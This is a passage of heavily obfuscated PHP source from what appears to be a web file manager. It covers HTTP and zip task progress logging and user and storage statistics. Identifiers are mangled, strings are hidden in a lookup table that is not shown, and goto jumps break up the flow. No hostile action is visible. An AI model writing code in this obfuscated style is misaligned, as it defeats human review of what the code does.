$¢Û¢“ï² = $úË˜áÑÜ[$Úú£‘éƒ[1848]]; } if ($™š—Œëş[$Úú£‘éƒ[1827]] == $Úú£‘éƒ[110] && $¢Û¢“ï²) { $™š—Œëş[$Úú£‘éƒ[1828]] += $¢Û¢“ï²; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $‰‹ î¶Ë =& $_SERVER[°‰†òö¯]; $ë¸¿ò½ì =& $this->task; $ë¸¿ò½ì[$‰‹ î¶Ë[1849]] = 1; Hook::bind($‰‹ î¶Ë[1817], array($this, $‰‹ î¶Ë[1850])); Hook::bind($‰‹ î¶Ë[1819], array($this, $‰‹ î¶Ë[1851])); Hook::bind($‰‹ î¶Ë[1821], array($this, $‰‹ î¶Ë[1852])); } protected function endAfter() { $¦¸ÊÄûº =& $_SERVER[°‰†òö¯]; Hook::unbind($¦¸ÊÄûº[1817], array($this, $¦¸ÊÄûº[1850])); Hook::unbind($¦¸ÊÄûº[1819], array($this, $¦¸ÊÄûº[1851])); Hook::unbind($¦¸ÊÄûº[1821], array($this, $¦¸ÊÄûº[1852])); } public function progressStart($ÉŸ³²öÚ) { $À®Çø©• =& $_SERVER[°‰†òö¯]; $‡¾‘…Ãò = curl_getinfo($ÉŸ³²öÚ); self::log($À®Çø©•[1853] . $‡¾‘…Ãò[$À®Çø©•[384]]); self::valueSet($this->task[$À®Çø©•[477]], $this->task); } public function progressEnd($…™Ëƒ¢Ï) { $±‡Ù•¡ =& $_SERVER[°‰†òö¯]; self::log($±‡Ù•¡[1854] . $this->task[$±‡Ù•¡[477]]); $this->end(); } public function progress($—¯»®É, $‘ĞÉ®Ï«, $“™ƒ€×, $îÀœñÓ, $Ë“Òø×è) { $áŞ€éÙŞ =& $_SERVER[°‰†òö¯]; $ôÎĞ³»‡ =& $this->task; if ($Ë“Òø×è > 0) { $ôÎĞ³»‡[$áŞ€éÙŞ[1138]] = $ôÎĞ³»‡[$áŞ€éÙŞ[1138]] == 0 ? $îÀœñÓ : $ôÎĞ³»‡[$áŞ€éÙŞ[1138]]; $ôÎĞ³»‡[$áŞ€éÙŞ[1772]] = $Ë“Òø×è; } else { if ($“™ƒ€× > 0) { $ôÎĞ³»‡[$áŞ€éÙŞ[1138]] = $ôÎĞ³»‡[$áŞ€éÙŞ[1138]] == 0 ? $‘ĞÉ®Ï« : $ôÎĞ³»‡[$áŞ€éÙŞ[1138]]; $ôÎĞ³»‡[$áŞ€éÙŞ[1772]] = $“™ƒ€×; } } $this->update(); self::log("\160\162\x6f\x67\x72\145\163\163\110\164\x74\x70\72\144\157\x77\156\72{$“™ƒ€×}\x2f{$‘ĞÉ®Ï«}\73\40\165\x70\x6c\157\x61\x64\72{$Ë“Òø×è}\x2f{$îÀœñÓ}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($úÅ°¬³à, $ü€Ÿºƒï = '', $èñö§ßŒ = 0, $¦šºŒº¥ = '') { $‚‡êô‚ =& $_SERVER[°‰†òö¯]; $¦šºŒº¥ = $¦šºŒº¥ ? $¦šºŒº¥ : ($ü€Ÿºƒï ? $ü€Ÿºƒï : $úÅ°¬³à); $¾¥½‡âÍ = new Task($úÅ°¬³à, $ü€Ÿºƒï, $èñö§ßŒ, $¦šºŒº¥); $GLOBALS[$‚‡êô‚[1855] . $úÅ°¬³à] = new TaskLog($‚‡êô‚[1754], $¾¥½‡âÍ, $¦šºŒº¥); return $¾¥½‡âÍ; } public function __construct($Ó³óœÀ = '', $ÇÑ°ô™ = '', $õ §„¼ô = '') { $ö¤ÃŒÉ˜ =& $_SERVER[°‰†òö¯]; if (!$Ó³óœÀ) { $Ó³óœÀ = $ö¤ÃŒÉ˜[1754]; } $µ¸Ãı¸” = $Ó³óœÀ . $ö¤ÃŒÉ˜[464] . rand_string(10); if (!$õ §„¼ô) { $õ §„¼ô = $Ó³óœÀ . $ö¤ÃŒÉ˜[53] . $õ §„¼ô; } switch ($Ó³óœÀ) { case $ö¤ÃŒÉ˜[1754]: if (!$ÇÑ°ô™ || !$ÇÑ°ô™->task) { return echoLog($Ó³óœÀ . $ö¤ÃŒÉ˜[1856]); } $éòú˜€„ = $ÇÑ°ô™; $µ¸Ãı¸” = $éòú˜€„->task[$ö¤ÃŒÉ˜[477]]; $Ó³óœÀ = $éòú˜€„->task[$ö¤ÃŒÉ˜[477]]; if (!$éòú˜€„->task[$ö¤ÃŒÉ˜[1659]]) { $éòú˜€„->task[$ö¤ÃŒÉ˜[1659]] = $õ §„¼ô ? $õ §„¼ô : $Ó³óœÀ; } break; case $ö¤ÃŒÉ˜[1857]: if (!$ÇÑ°ô™) { return echoLog($Ó³óœÀ . $ö¤ÃŒÉ˜[1858]); } $¤¯ª•™‚ = is_string($ÇÑ°ô™) ? array($ÇÑ°ô™) : $ÇÑ°ô™; $éòú˜€„ = new TaskFileTransfer($µ¸Ãı¸”, $Ó³óœÀ, 0, $õ §„¼ô ? $õ §„¼ô : $¤¯ª•™‚[0]); foreach ($¤¯ª•™‚ as $Ûµƒ¿ïÕ) { $éòú˜€„->addPath($Ûµƒ¿ïÕ); } break; case $ö¤ÃŒÉ˜[390]: if (!$ÇÑ°ô™) { return echoLog($Ó³óœÀ . $ö¤ÃŒÉ˜[1858]); } $¤¯ª•™‚ = is_string($ÇÑ°ô™) ? array($ÇÑ°ô™) : $ÇÑ°ô™; $éòú˜€„ = new TaskZip($µ¸Ãı¸”, $Ó³óœÀ, 0, $õ §„¼ô ? $õ §„¼ô : $¤¯ª•™‚[0]); foreach ($¤¯ª•™‚ as $Ûµƒ¿ïÕ) { $éòú˜€„->addPath($Ûµƒ¿ïÕ); } break; case $ö¤ÃŒÉ˜[1297]: if (!$ÇÑ°ô™) { return echoLog($Ó³óœÀ . $ö¤ÃŒÉ˜[1858]); } $éòú˜€„ = new TaskUnZip($µ¸Ãı¸”, $Ó³óœÀ, 0, $õ §„¼ô ? $õ §„¼ô : $ÇÑ°ô™); if ($ÇÑ°ô™) { $éòú˜€„->addFile($ÇÑ°ô™); } break; case $ö¤ÃŒÉ˜[152]: $éòú˜€„ = new TaskHttp($µ¸Ãı¸”, $Ó³óœÀ); break; default: return; break; } $this->task = $éòú˜€„; $this->taskID = $µ¸Ãı¸”; Hook::bind($ö¤ÃŒÉ˜[1792], array($this, $ö¤ÃŒÉ˜[1859])); Hook::bind($ö¤ÃŒÉ˜[1794], array($this, $ö¤ÃŒÉ˜[1860])); Hook::bind($ö¤ÃŒÉ˜[1788], array($this, $ö¤ÃŒÉ˜[1861])); echoLog($ö¤ÃŒÉ˜[1862] . $éòú˜€„->task[$ö¤ÃŒÉ˜[1659]]); } public function __destruct() { $this->end(); } public function end($­çô»‡ = '') { $ª›ÛçÎ¸ =& $_SERVER[°‰†òö¯]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($­çô»‡); $this->task = !1; $this->taskID = !1; Hook::unbind($ª›ÛçÎ¸[1792], array($this, $ª›ÛçÎ¸[1859])); Hook::unbind($ª›ÛçÎ¸[1794], array($this, $ª›ÛçÎ¸[1860])); Hook::unbind($ª›ÛçÎ¸[1788], array($this, $ª›ÛçÎ¸[1861])); } public function taskUpdate($œŞ¸›şĞ) { $éÏ»Ô€û =& $_SERVER[°‰†òö¯]; if (!$œŞ¸›şĞ || $this->taskID != $œŞ¸›şĞ[$éÏ»Ô€û[477]]) { return; } $˜ÎÅŞ¯¼ = 20; $²Ëü‚»É = intval($œŞ¸›şĞ[$éÏ»Ô€û[1773]] * $˜ÎÅŞ¯¼); $§Šİ·€ = $éÏ»Ô€û[176] . str_repeat($éÏ»Ô€û[508], $²Ëü‚»É) . $éÏ»Ô€û[1089] . str_repeat($éÏ»Ô€û[53], $˜ÎÅŞ¯¼ - $²Ëü‚»É) . $éÏ»Ô€û[178]; $ƒ¡¯Ìè = $§Šİ·€ . sprintf($éÏ»Ô€û[1863], $œŞ¸›şĞ[$éÏ»Ô€û[1773]] * 100) . $éÏ»Ô€û[1864]; $©š²ŠØ = $ƒ¡¯Ìè . $œŞ¸›şĞ[$éÏ»Ô€û[1772]] . $éÏ»Ô€û[8] . $œŞ¸›şĞ[$éÏ»Ô€û[1138]] . LNG($éÏ»Ô€û[1865]); $‰ûê´¼ = $éÏ»Ô€û[12]; if ($œŞ¸›şĞ[$éÏ»Ô€û[1849]]) { $©š²ŠØ = $ƒ¡¯Ìè . size_format($œŞ¸›şĞ[$éÏ»Ô€û[1772]]) . $éÏ»Ô€û[8] . size_format($œŞ¸›şĞ[$éÏ»Ô€û[1138]]); $‰ûê´¼ = size_format($œŞ¸›şĞ[$éÏ»Ô€û[1774]]) . $éÏ»Ô€û[1866]; } if ($œŞ¸›şĞ[$éÏ»Ô€û[1140]]) { $œŞ¸›şĞ[$éÏ»Ô€û[1823]] = $œŞ¸›şĞ[$éÏ»Ô€û[1140]] . $éÏ»Ô€û[53] . $œŞ¸›şĞ[$éÏ»Ô€û[1823]]; } if ($œŞ¸›şĞ[$éÏ»Ô€û[1823]]) { $ •å¸î = $éÏ»Ô€û[12]; if ($œŞ¸›şĞ[$éÏ»Ô€û[1825]]) { $ •å¸î = $éÏ»Ô€û[50] . size_format($œŞ¸›şĞ[$éÏ»Ô€û[1826]]) . $éÏ»Ô€û[8] . size_format($œŞ¸›şĞ[$éÏ»Ô€û[1825]]); } $‰ûê´¼ .= $œŞ¸›şĞ[$éÏ»Ô€û[1823]] . $ •å¸î; } if ($œŞ¸›şĞ[$éÏ»Ô€û[824]] && !$œŞ¸›şĞ[$éÏ»Ô€û[1825]]) { $‰ûê´¼ .= $éÏ»Ô€û[53] . size_format($œŞ¸›şĞ[$éÏ»Ô€û[1830]]) . $éÏ»Ô€û[8] . size_format($œŞ¸›şĞ[$éÏ»Ô€û[824]]); } echoLog($©š²ŠØ . $éÏ»Ô€û[53] . $‰ûê´¼, !0); } public function taskEnd($¤±ÕŠ­Ê) { $Œ°î¯ù« =& $_SERVER[°‰†òö¯]; if (!$¤±ÕŠ­Ê || $this->taskID != $¤±ÕŠ­Ê[$Œ°î¯ù«[477]]) { return; } $ãÊıñ• = $¤±ÕŠ­Ê ? LNG($Œ°î¯ù«[1867]) . $Œ°î¯ù«[4] . $¤±ÕŠ­Ê[$Œ°î¯ù«[1772]] . $Œ°î¯ù«[8] . $¤±ÕŠ­Ê[$Œ°î¯ù«[1138]] . LNG($Œ°î¯ù«[1865]) . $Œ°î¯ù«[74] : $Œ°î¯ù«[12]; echoLog($Œ°î¯ù«[1868] . $¤±ÕŠ­Ê[$Œ°î¯ù«[1659]] . ($¤±ÕŠ­Ê[$Œ°î¯ù«[528]] ? $Œ°î¯ù«[74] . $¤±ÕŠ­Ê[$Œ°î¯ù«[528]] : $Œ°î¯ù«[12]) . $Œ°î¯ù«[74] . $ãÊıñ• . $Œ°î¯ù«[1869] . sprintf($Œ°î¯ù«[918], timeFloat() - $¤±ÕŠ­Ê[$Œ°î¯ù«[1775]]) . $Œ°î¯ù«[1787]); $this->end(); } public function taskKill($‘ Î”íÖ) { $À»½‡ =& $_SERVER[°‰†òö¯]; if (!$‘ Î”íÖ || $this->taskID != $‘ Î”íÖ[$À»½‡[477]]) { return; } echoLog($À»½‡[1870] . $‘ Î”íÖ[$À»½‡[1659]]); } } goto B‰™Åê‰™; CôÕ‘Õ­à: class TaskZip extends TaskFileTransfer { protected function startAfter() { $«Û³ÒÙ¼ =& $_SERVER[°‰†òö¯]; parent::startAfter(); Hook::bind($«Û³ÒÙ¼[1897], array($this, $«Û³ÒÙ¼[1887])); Hook::bind($«Û³ÒÙ¼[1889], array($this, $«Û³ÒÙ¼[1890])); $ôÜëæ© =& $this->task; $ôÜëæ©[$«Û³ÒÙ¼[1891]] = $«Û³ÒÙ¼[1277]; if (!$ôÜëæ©[$«Û³ÒÙ¼[1659]]) { $ôÜëæ©[$«Û³ÒÙ¼[1659]] = LNG($«Û³ÒÙ¼[1898]); } } protected function endAfter() { $è–÷ˆÍÍ =& $_SERVER[°‰†òö¯]; parent::endAfter(); Hook::unbind($è–÷ˆÍÍ[1897], array($this, $è–÷ˆÍÍ[1887])); Hook::unbind($è–÷ˆÍÍ[1889], array($this, $è–÷ˆÍÍ[1890])); } public function updateAfter() { $·°‘Ñ¹ =& $_SERVER[°‰†òö¯]; $ÈÚÛä¦ñ =& $this->task; if (!$ÈÚÛä¦ñ[$·°‘Ñ¹[1138]] || !$ÈÚÛä¦ñ[$·°‘Ñ¹[824]]) { return; } if ($ÈÚÛä¦ñ[$·°‘Ñ¹[1891]] == $·°‘Ñ¹[1277]) { $ƒşù¤›í = $ÈÚÛä¦ñ[$·°‘Ñ¹[1826]]; if ($ÈÚÛä¦ñ[$·°‘Ñ¹[1827]] != $·°‘Ñ¹[1277]) { $ƒşù¤›í = 0; } $üœàäâ÷ = ($ÈÚÛä¦ñ[$·°‘Ñ¹[1830]] + $ƒşù¤›í) / $ÈÚÛä¦ñ[$·°‘Ñ¹[824]]; $ÈÚÛä¦ñ[$·°‘Ñ¹[1773]] = $üœàäâ÷ * 0.3; } else { if ($ÈÚÛä¦ñ[$·°‘Ñ¹[1891]] == $·°‘Ñ¹[390]) { $üœàäâ÷ = $ÈÚÛä¦ñ[$·°‘Ñ¹[1772]] / $ÈÚÛä¦ñ[$·°‘Ñ¹[1138]]; $ÈÚÛä¦ñ[$·°‘Ñ¹[1773]] = 0.3 + $üœàäâ÷ * 0.5; } else { if ($ÈÚÛä¦ñ[$·°‘Ñ¹[1891]] == $·°‘Ñ¹[110]) { $üœàäâ÷ = 0; if ($ÈÚÛä¦ñ[$·°‘Ñ¹[1825]]) { $üœàäâ÷ = $ÈÚÛä¦ñ[$·°‘Ñ¹[1826]] / $ÈÚÛä¦ñ[$·°‘Ñ¹[1825]]; } $ÈÚÛä¦ñ[$·°‘Ñ¹[1773]] = 0.3 + 0.5 + $üœàäâ÷ * 0.2; } } } if ($ÈÚÛä¦ñ[$·°‘Ñ¹[1773]] > 0) { $˜ëı¦áÈ = timeFloat() - $ÈÚÛä¦ñ[$·°‘Ñ¹[1775]] - $ÈÚÛä¦ñ[$·°‘Ñ¹[1778]]; $ÈÚÛä¦ñ[$·°‘Ñ¹[1779]] = $˜ëı¦áÈ * (1 - $ÈÚÛä¦ñ[$·°‘Ñ¹[1773]]) / $ÈÚÛä¦ñ[$·°‘Ñ¹[1773]]; } } public function copyFileStart($³Š§Ìıª, $ªËÔ‘Î», $ÁØ¯Ò§, $¯ú±ËÒ, $ÔäÃïÜÛ, $ÀìÉã§í) { $öö¶ÔÖÓ =& $_SERVER[°‰†òö¯]; parent::copyFileStart($³Š§Ìıª, $ªËÔ‘Î», $ÁØ¯Ò§, $¯ú±ËÒ, $ÔäÃïÜÛ, $ÀìÉã§í); $šã•àÜ =& $this->task; if ($šã•àÜ[$öö¶ÔÖÓ[1891]] == $öö¶ÔÖÓ[390]) { $šã•àÜ[$öö¶ÔÖÓ[1891]] = $öö¶ÔÖÓ[110]; } $this->update(); } public function copyFileEnd($’À§˜î·, $•„¾œ—Î, $Ì¸îéæ, $Îò·—ş‹, $Öèîœé¼, $»Å½‡É¦) { $Ñ£ÏÈŸã =& $_SERVER[°‰†òö¯]; $îœí³ïŸ =& $this->task; $îœí³ïŸ[$Ñ£ÏÈŸã[1826]] = $îœí³ïŸ[$Ñ£ÏÈŸã[1825]]; $îœí³ïŸ[$Ñ£ÏÈŸã[1830]] += $îœí³ïŸ[$Ñ£ÏÈŸã[1825]]; $îœí³ïŸ[$Ñ£ÏÈŸã[1827]] = $Ñ£ÏÈŸã[12]; $this->update(); } public function zipEvent($Ğ½Ã¿·, $¶”Æí³¾, $²Ú™Òµ³, $ãÄ€ˆÀ¤) { $©ƒÃ¡Š =& $_SERVER[°‰†òö¯]; $É±ã‰Á =& $this->task; $É±ã‰Á[$©ƒÃ¡Š[1823]] = get_path_this($¶”Æí³¾); $É±ã‰Á[$©ƒÃ¡Š[1825]] = $ãÄ€ˆÀ¤; $É±ã‰Á[$©ƒÃ¡Š[1826]] = $²Ú™Òµ³; $É±ã‰Á[$©ƒÃ¡Š[1140]] = $Ğ½Ã¿· == $©ƒÃ¡Š[1899] ? $©ƒÃ¡Š[1894] : $©ƒÃ¡Š[1895]; $É±ã‰Á[$©ƒÃ¡Š[1827]] = $©ƒÃ¡Š[12]; $É±ã‰Á[$©ƒÃ¡Š[824]] = $ãÄ€ˆÀ¤; $É±ã‰Á[$©ƒÃ¡Š[1891]] = $©ƒÃ¡Š[390]; $this->update(); } public function nameParse($øÑº“¢˜) { $åÁ¿ÓÇ =& $_SERVER[°‰†òö¯]; $¶†éï¸” =& $this->task; if ($¶†éï¸”[$åÁ¿ÓÇ[1772]] < $¶†éï¸”[$åÁ¿ÓÇ[1138]]) { $¹Ç…ù·¬ = get_path_this($øÑº“¢˜); if (strstr($¹Ç…ù·¬, $åÁ¿ÓÇ[10])) { $¶†éï¸”[$åÁ¿ÓÇ[1772]] += 1; } } if ($¶†éï¸”[$åÁ¿ÓÇ[1891]] == $åÁ¿ÓÇ[1277]) { $¶†éï¸”[$åÁ¿ÓÇ[1891]] = $åÁ¿ÓÇ[390]; } $¶†éï¸”[$åÁ¿ÓÇ[1823]] = $øÑº“¢˜; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($°…®¨ĞÚ) { $Öë“«¸ =& $_SERVER[°‰†òö¯]; $”»²¬ç¸ = array($Öë“«¸[669] => array($Öë“«¸[33] => $Öë“«¸[1900], $Öë“«¸[352] => array($Öë“«¸[284], $Öë“«¸[826], $Öë“«¸[1901], $Öë“«¸[1902])), $Öë“«¸[1903] => array($Öë“«¸[33] => $Öë“«¸[1904], $Öë“«¸[352] => array($Öë“«¸[284], $Öë“«¸[824], $Öë“«¸[1905], $Öë“«¸[1906], $Öë“«¸[1907]))); if (!isset($”»²¬ç¸[$°…®¨ĞÚ])) { return !1; } $this->optionType = $”»²¬ç¸[$°…®¨ĞÚ][$Öë“«¸[33]]; $this->field = $”»²¬ç¸[$°…®¨ĞÚ][$Öë“«¸[352]]; return !0; } public function listData($‚§ò‹¤ = false, $Ğö¢‚›à = "\155\157\x64\x69\x66\171\x54\x69\155\x65", $˜öèœ¸ã = false) { return parent::listData($‚§ò‹¤, $Ğö¢‚›à, $˜öèœ¸ã); } public function trendList($ ¦¡¼îµ) { $ÁñäëŠÎ =& $_SERVER[°‰†òö¯]; $˜ôú×Û´ = $this->listData(); if ($˜ôú×Û´) { $À‰ËÒ‡ = end($˜ôú×Û´); $öÕÓÎÑù = date($ÁñäëŠÎ[1908], strtotime($ÁñäëŠÎ[1909])); if ($À‰ËÒ‡[$ÁñäëŠÎ[284]] == $öÕÓÎÑù) { return $˜ôú×Û´; } $¶ñË¾‘  = strtotime($À‰ËÒ‡[$ÁñäëŠÎ[284]]); } if (!isset($¶ñË¾‘ )) { $½¹‰“¸ = $ ¦¡¼îµ == $ÁñäëŠÎ[669] ? $ÁñäëŠÎ[601] : $ÁñäëŠÎ[891]; $¶ñË¾‘  = Model($½¹‰“¸)->min($ÁñäëŠÎ[233]); } $² éöğ£ = $ÁñäëŠÎ[1910] . ucfirst($ ¦¡¼îµ); $íı¹Ç¤Æ = $this->dateList($¶ñË¾‘ ); foreach ($íı¹Ç¤Æ as $öÕÓÎÑù) { $this->{$² éöğ£}($öÕÓÎÑù); } return $this->listData(); } private function dateList($“ƒËÓş†) { $õò¯å =& $_SERVER[°‰†òö¯]; $òÅïŒ = $“ƒËÓş†; $¥ïÍÎ›ô = strtotime($õò¯å[1909]); $§ô—¿³ = array(); while ($òÅïŒ <= $¥ïÍÎ›ô) { $§ô—¿³[] = date($õò¯å[1908], $òÅïŒ); $òÅïŒ = strtotime($õò¯å[1911], $òÅïŒ); } return $§ô—¿³; } public function _recordUser($İ‘»È¤ = '') { $ôÆûŠ’Æ =& $_SERVER[°‰†òö¯]; $£ÇÆÀ¯É = strtotime(date($ôÆûŠ’Æ[1912], strtotime($İ‘»È¤))); $›÷¨·³Ô = strtotime(date($ôÆûŠ’Æ[1913], strtotime($İ‘»È¤))); $­¤Âì­è = array($ôÆûŠ’Æ[233] => array($ôÆûŠ’Æ[1088], $›÷¨·³Ô)); $¯™´÷æä = Model($ôÆûŠ’Æ[601])->where($­¤Âì­è)->count($ôÆûŠ’Æ[1771]); $­¤Âì­è[$ôÆûŠ’Æ[233]] = array($ôÆûŠ’Æ[410], array($£ÇÆÀ¯É, $›÷¨·³Ô)); $¨àÔ°Úö = Model($ôÆûŠ’Æ[601])->where($­¤Âì­è)->count($ôÆûŠ’Æ[1771]); $­¤Âì­è[$ôÆûŠ’Æ[33]] = $ôÆûŠ’Æ[1914]; $Ş¡·Êô = Model($ôÆûŠ’Æ[1915])->where($­¤Âì­è)->count($ôÆûŠ’Æ[1916]); $‡á‰› = array($ôÆûŠ’Æ[284] => $İ‘»È¤, $ôÆûŠ’Æ[826] => (int) $¯™´÷æä, $ôÆûŠ’Æ[1901] => (int) $¨àÔ°Úö, $ôÆûŠ’Æ[1902] => (int) $Ş¡·Êô); return $this->insert($‡á‰›); } public function _recordStore($¹™ÄÓ°ê = '') { $ûŒ’Å”à =& $_SERVER[°‰†òö¯]; $àë‚âåš = strtotime(date($ûŒ’Å”à[1913], strtotime($¹™ÄÓ°ê))); $Œˆ—åÇ = array($ûŒ’Å”à[233] => array($ûŒ’Å”à[1088], $àë‚âåš)); $ŞÊÔØšâ = Model($ûŒ’Å”à[548])->where($Œˆ—åÇ)->sum($ûŒ’Å”à[79]); $Œˆ—åÇ[$ûŒ’Å”à[487]] = 0; $åß´Ò«„ = Model($ûŒ’Å”à[891])->where($Œˆ—åÇ)->sum($ûŒ’Å”à[79]); $Œˆ—åÇ[$ûŒ’Å”à[190]] = 1; $Ä˜ŸßÜ = Model($ûŒ’Å”à[891])->where($Œˆ—åÇ)->sum($ûŒ’Å”à[79]); $Œˆ—åÇ[$ûŒ’Å”à[190]] = 2; $•‘®ä”Î = Model($ûŒ’Å”à[891])->where($Œˆ—åÇ)->sum($ûŒ’Å”à[79]); $¥Ä³ùóÆ = array($ûŒ’Å”à[284] => $¹™ÄÓ°ê, $ûŒ’Å”à[824] => (int) $åß´Ò«„, $ûŒ’Å”à[1905] => (int) $ŞÊÔØšâ, $ûŒ’Å”à[1906] => (int) $Ä˜ŸßÜ, $ûŒ’Å”à[1907] => (int) $•‘®ä”Î); return $this->insert($¥Ä³ùóÆ); } public function trend($ÉœÂ´‚ö, $˜Æ¢ûŞ) { $¢Ù´ñë€ =& $_SERVER[°‰†òö¯]; if (!$this->init($ÉœÂ´‚ö)) { return !1; } $Õ§âÇÎ = $this->trendList($ÉœÂ´‚ö); if ($Õ§âÇÎ && $˜Æ¢ûŞ != $¢Ù´ñë€[1743]) { $ÕŠ…÷¹ = $Õ§âÇÎ[0][$¢Ù´ñë€[284]]; $ˆİÀ©Úë = $this->validDate($˜Æ¢ûŞ, $ÕŠ…÷¹); $ÑÕ±õ = array(); $é¸˜İš‚ = array_to_keyvalue($Õ§âÇÎ, $¢Ù´ñë€[284]); foreach ($ˆİÀ©Úë as $áıÔ±Ç) { if (isset($é¸˜İš‚[$áıÔ±Ç])) { $—›‘½Ù = $é¸˜İš‚[$áıÔ±Ç]; } else { $—›‘½Ù = end($Õ§âÇÎ); $—›‘½Ù[$¢Ù´ñë€[284]] = $áıÔ±Ç; if ($ÉœÂ´‚ö == $¢Ù´ñë€[669]) { $—›‘½Ù[$¢Ù´ñë€[1901]] = $—›‘½Ù[$¢Ù´ñë€[1902]] = 0; } } $ÑÕ±õ[] = $—›‘½Ù; } $Õ§âÇÎ = $ÑÕ±õ; } $¡ÕÂ—ŞÓ = array($¢Ù´ñë€[669] => array($¢Ù´ñë€[826] => LNG($¢Ù´ñë€[1917]), $¢Ù´ñë€[1901] => LNG($¢Ù´ñë€[1918]), $¢Ù´ñë€[1902] => LNG($¢Ù´ñë€[1919])), $¢Ù´ñë€[1903] => array($¢Ù´ñë€[824] => LNG($¢Ù´ñë€[1920]), $¢Ù´ñë€[1905] => LNG($¢Ù´ñë€[1921]), $¢Ù´ñë€[1906] => LNG($¢Ù´ñë€[1922]), $¢Ù´ñë€[1907] => LNG($¢Ù´ñë€[1923]))); $ƒúØ¡ëÇ = array($¢Ù´ñë€[669] => $¢Ù´ñë€[1924], $¢Ù´ñë€[1903] => $¢Ù´ñë€[79]); if (empty($Õ§âÇÎ)) { $áıÔ±Ç = date($¢Ù´ñë€[1908], strtotime($¢Ù´ñë€[1909])); $‚Òñ–Ù = array($¢Ù´ñë€[284] => $áıÔ±Ç); foreach ($¡ÕÂ—ŞÓ[$ÉœÂ´‚ö] as $Ş¨°Ä—× => $ÆŞ–…›ü) { $‚Òñ–Ù[$Ş¨°Ä—×] = 0; } $Õ§âÇÎ[] = $‚Òñ–Ù; } $ç§™÷Ë = array(); foreach ($Õ§âÇÎ as $ÆŞ–…›ü) { if ($ÉœÂ´‚ö == $¢Ù´ñë€[1903] && $ÆŞ–…›ü[$¢Ù´ñë€[1905]] > $ÆŞ–…›ü[$¢Ù´ñë€[824]]) { $ÆŞ–…›ü[$¢Ù´ñë€[1905]] = $ÆŞ–…›ü[$¢Ù´ñë€[824]]; } foreach ($¡ÕÂ—ŞÓ[$ÉœÂ´‚ö] as $Ş¨°Ä—× => $¬ ­º‡) { $—›‘½Ù = array($¢Ù´ñë€[284] => $ÆŞ–…›ü[$¢Ù´ñë€[284]], $¢Ù´ñë€[1659] => $¬ ­º‡); $—›‘½Ù[$ƒúØ¡ëÇ[$ÉœÂ´‚ö]] = isset($ÆŞ–…›ü[$Ş¨°Ä—×]) ? $ÆŞ–…›ü[$Ş¨°Ä—×] : 0; $ç§™÷Ë[] = $—›‘½Ù; } } return $ç§™÷Ë; } public function validDate($«Ì “ˆì, $±¢ñŒè) { $‘ö§Òì¾ =& $_SERVER[°‰†òö¯]; $È¢ó‚÷Ü = date($‘ö§Òì¾[1908], strtotime($‘ö§Òì¾[1909])); $ÕÛëÍ° = array($È¢ó‚÷Ü); switch ($«Ì “ˆì) { case $‘ö§Òì¾[1750]: $²äÅŞ‚ = mktime(0, 0, 0, date($‘ö§Òì¾[1925]), date($‘ö§Òì¾[1450]) - date($‘ö§Òì¾[1540]) + 7 - 7, date($‘ö§Òì¾[1926])); $¾¦ûæ© = 0; do { $…èÀ¬“¨ = date($‘ö§Òì¾[1908], $²äÅŞ‚ - 3600 * 24 * 7 * $¾¦ûæ©); $ÕÛëÍ°[] = $…èÀ¬“¨; $¾¦ûæ©++; } while ($±¢ñŒè < $…èÀ¬“¨); break; case $‘ö§Òì¾[1748]: $¾¦ûæ© = 1; do { $ı¸ßĞƒ‹ = date($‘ö§Òì¾[1927], strtotime("\x2d\x20{$¾¦ûæ©}\x20\x6d\x6f\156\x74\x68\x73")); $ÕÛëÍ°[] = $ı¸ßĞƒ‹; $¾¦ûæ©++; } while ($±¢ñŒè < $ı¸ßĞƒ‹); break; case $‘ö§Òì¾[1928]: $²­İÃ = (int) date($‘ö§Òì¾[1926], strtotime($±¢ñŒè)); $ìÍøîå = (int) date($‘ö§Òì¾[1926]); if ($²­İÃ >= $ìÍøîå) { break; } for ($²­İÃ; $²­İÃ < $ìÍøîå; $²­İÃ++) { $ÕÛëÍ°[] = $²­İÃ . $‘ö§Òì¾[1929]; } break; default: break; } if ($±¢ñŒè > end($ÕÛëÍ°)) { array_pop($ÕÛëÍ°); } sort($ÕÛëÍ°); return $ÕÛëÍ°; } public function listTable($ñÜ…äù) { $¥á®šõ• = ucfirst($ñÜ…äù); return Model($¥á®šõ•)->listData(); } public function option($äû¡Ä¾ù) { $¥Ä‡öáÊ = $_SERVER[°‰†òö¯][1930] . ucfirst($äû¡Ä¾ù); return $this->{$¥Ä‡öáÊ}(); } private function optionUser() { $İãİ¨š =& $_SERVER[°‰†òö¯]; $šòî…ÛŠ = Model($İãİ¨š[601])->count($İãİ¨š[1771]); $•ƒº˜˜ = Model($İãİ¨š[601])->where($İãİ¨š[1931])->count($İãİ¨š[1771]); $‘ğ´Ö“È = intval($GLOBALS[$İãİ¨š[6]][$İãİ¨š[426]][$İãİ¨š[1716]]) / 3600; $¦ÛŠâ”ò = strtotime("\55{$‘ğ´Ö“È}\x20\150\x6f\165\162\x73"); $­†öªÈ = strtotime(date($İãİ¨š[1912])); if ($¦ÛŠâ”ò < $­†öªÈ) { $¦ÛŠâ”ò = $­†öªÈ; } $ÇùäŠÄ = array($İãİ¨š[1932] => array($İãİ¨š[1089], $¦ÛŠâ”ò)); $‡ŒğĞü = (int) Model($İãİ¨š[601])->where($ÇùäŠÄ)->count($İãİ¨š[1771]); if (!$‡ŒğĞü) { $‡ŒğĞü = 1; } $ÇùäŠÄ = array($İãİ¨š[1932] => array($İãİ¨š[1089], $­†öªÈ)); $¯ ©Ç = Model($İãİ¨š[601])->where($ÇùäŠÄ)->count($İãİ¨š[1771]); return array($İãİ¨š[819] => (int) $šòî…ÛŠ, $İãİ¨š[1933] => (int) ($šòî…ÛŠ - $•ƒº˜˜), $İãİ¨š[1934] => (int) $•ƒº˜˜, $İãİ¨š[1935] => (int) $¯ ©Ç, $İãİ¨š[1936] => $‡ŒğĞü); } private function optionFile() { $Éàâïï =& $_SERVER[°‰†òö¯]; $Ä¶¶˜‘Û = $this->sourceSize(); $èÃ’éñÌ = $Ä¶¶˜‘Û[$Éàâïï[79]]; $øî—ĞÖì = $Ä¶¶˜‘Û[$Éàâïï[1905]]; $¦Şı¦Ì¯ = Model($Éàâïï[891])->where(array($Éàâïï[487] => 0))->count($Éàâïï[193]); $Öãé“’å = array($Éàâïï[487] => 0, $Éàâïï[233] => array($Éàâïï[1089], 